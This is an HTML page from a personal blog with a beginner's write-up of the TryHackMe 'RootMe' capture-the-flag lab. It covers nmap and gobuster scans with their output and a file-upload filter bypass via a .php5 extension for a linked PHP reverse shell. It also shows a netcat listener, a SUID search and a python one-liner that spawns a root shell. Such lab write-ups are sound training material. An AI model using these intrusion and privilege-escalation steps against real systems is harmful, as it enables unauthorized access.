@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script>
+  <title>
+  Root Me · CCrashZer0
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CCrashZer0">
+<meta name="description" content="Try Hack Me - RootMe Link to heading A ctf for beginners, can you root me? Link to heading Reconnaissance Link to heading Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
+nmap -sC -sV -T4 -A -oN nmap/result &lt;IP&gt; Breakdown:
+-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Root Me">
+  <meta name="twitter:description" content="Try Hack Me - RootMe Link to heading A ctf for beginners, can you root me? Link to heading Reconnaissance Link to heading Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
+nmap -sC -sV -T4 -A -oN nmap/result &lt;IP&gt; Breakdown:
+-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal.">
+
+<meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/rootme/">
+  <meta property="og:site_name" content="CCrashZer0">
+  <meta property="og:title" content="Root Me">
+  <meta property="og:description" content="Try Hack Me - RootMe Link to heading A ctf for beginners, can you root me? Link to heading Reconnaissance Link to heading Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
+nmap -sC -sV -T4 -A -oN nmap/result &lt;IP&gt; Breakdown:
+-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="tutorials">
+    <meta property="article:published_time" content="2025-02-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-09T00:00:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/rootme/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/">
+      CCrashZer0
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/tutorials/">Tutorials</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/rootme/">
+          Root Me
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="try-hack-me---rootme">
+  Try Hack Me - RootMe
+  <a class="heading-link" href="#try-hack-me---rootme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="br">
+  A ctf for beginners, can you root me?
+<br>
+  <a class="heading-link" href="#br">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ol>
+<li>
+<p>Scan the machine, how many ports are open?
+Here is the nmap scann commands that I am going to be using.</p>
+<pre tabindex="0"><code>nmap -sC -sV -T4 -A -oN nmap/result &lt;IP&gt;
+</code></pre><p>Breakdown:</p>
+<pre tabindex="0"><code>-A: do an extensive scan on these ports
+
+-sC: Scan with default NSE scripts. Considered useful for discovery and safe
+
+-sV: Attempts to determine the version of the service running on port
+
+-T4: speed of nmap scan is 4/5 (personal preference of mine)
+
+-oN: Normal output to the file normal.file
+</code></pre></li>
+<li>
+<p>What version of Apache is running?
+Let&rsquo;s review out nmap scans and see if we are able to find what version of Apache we are running.</p>
+<pre tabindex="0"><code>Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></li>
+<li>
+<p>What service is running on port 22?
+If you review the resutls fo the nmap scan you will see that there is a service running on port 22.</p>
+</li>
+<li>
+<p>Find directories on the web server using the GoBuster tool.
+We are going to run the following gobuster command to search for the hidden directory that they want us to find.</p>
+<pre tabindex="0"><code>gobuster dir -t 40 -u &lt;IP&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre><p>Breakdown:</p>
+<pre tabindex="0"><code>-u: Full URL (including scheme), or base domain name.
+
+-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)
+
+-w: Path to the wordlist used for brute forcing (use – for stdin)
+</code></pre></li>
+<li>
+<p>What is the hidden directory?
+Do any of these directiores stand out!</p>
+<pre tabindex="0"><code>===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://&lt;IP&gt;/
+[+] Threads:        40
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/11 19:14:32 Starting gobuster
+===============================================================
+/uploads (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/panel (Status: 301)
+Progress: 23943 / 220561 (10.86%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2021/02/11 19:15:44 Finished
+===============================================================
+</code></pre></li>
+</ol>
+<hr>
+<h2 id="getting-a-shell">
+  Getting a shell
+  <a class="heading-link" href="#getting-a-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ol>
+<li>Find a form to upload and get a reverse shell, and find the flag.
+In out last question we found a hidden directory.
+Let&rsquo;s open up our browser and got the following <code>http:\\&lt;IP&gt;\uploads</code>
+<figure><img src="/images/rootme/1.png" width="200">
+</figure>
+
+Now lets try and upload a php reverse shell.<br>
+<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"  class="external-link" target="_blank" rel="noopener">Pentest Monkey</a> is a great resourse for us to use.
+Now that we have our reverse shell let&rsquo;s add the ip address of our device into it and pick out a port we want to listen in on.
+Ok, lets try and upload our reverse shell&hellip; It looks like are now able to upload our file.
+<figure><img src="/images/rootme/2.png" width="200">
+</figure>
+
+How about we change the extention from PHP to PHP5 and then try again.
+How about them apples, it uploaded.
+Before we try and excute our payload lets set up a netcat listener.
+<code>nc -nlvp &lt;port#&gt;</code>
+Once our listener has been set up lets pull the trigger on our reverse shell and see if a connection can be made.
+<figure><img src="/images/rootme/3.png" width="200">
+</figure>
+
+BOOM!! We have a connection.
+The next thing we need to do is find the user.txt file.
+I tried looking in all the stander places like the current user directory and in the home directory but I did not have any luck.
+So I decided to use the find command <code>find / -type f -name user.txt 2&gt; /dev/null</code>
+With this command I was able to locate where our user.txt file is.
+Now all we need to do is cat out the content of our user.txt file and we will have our flag.</li>
+</ol>
+<p>Breakdown:</p>
+<pre tabindex="0"><code>* -type f – you are telling find to look exclusively for files
+* -name user.txt – instructing the find command to search for a file with the name “user.txt”
+* 2&gt; /dev/null – so error messages do not show up as part of the search result 
+</code></pre><h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<hr>
+<ol>
+<li>Search for files with SUID permission, which file is weird?
+Again here we are going to be using the <code>find</code> command to help us locate our file with a weird SUID permission.</li>
+</ol>
+<pre tabindex="0"><code>find / -type f -user root -perm -u=s 2&gt; /dev/null_**
+</code></pre><p>Now how can use leverage this what we have found to escalate out privileges to a root shell.
+<a href="https://gtfobins.github.io/gtfobins/python/#suid"  class="external-link" target="_blank" rel="noopener">GTFO Bins</a> is another great resourse that we can use.
+Let&rsquo;s head over there and look up the SUID for python.
+It seems that we are that we are able to use the code below to gain a root shell.</p>
+<pre tabindex="0"><code>./python -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
+</code></pre><ol start="2">
+<li>root.txt
+One we have verified that we are actually running as root we will just need to cat out the content of out root.txt file.
+<code>cat /root/root.txt</code></li>
+</ol>
+<h1 id="congratulations-you-have-just-completed-the-rootme-challenge-from-tryhackme">
+  Congratulations you have just completed the RootMe challenge from TryHackMe!
+  <a class="heading-link" href="#congratulations-you-have-just-completed-the-rootme-challenge-from-tryhackme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CCrashZer0 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/CCrashZer0/ccrashzer0.github.io/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
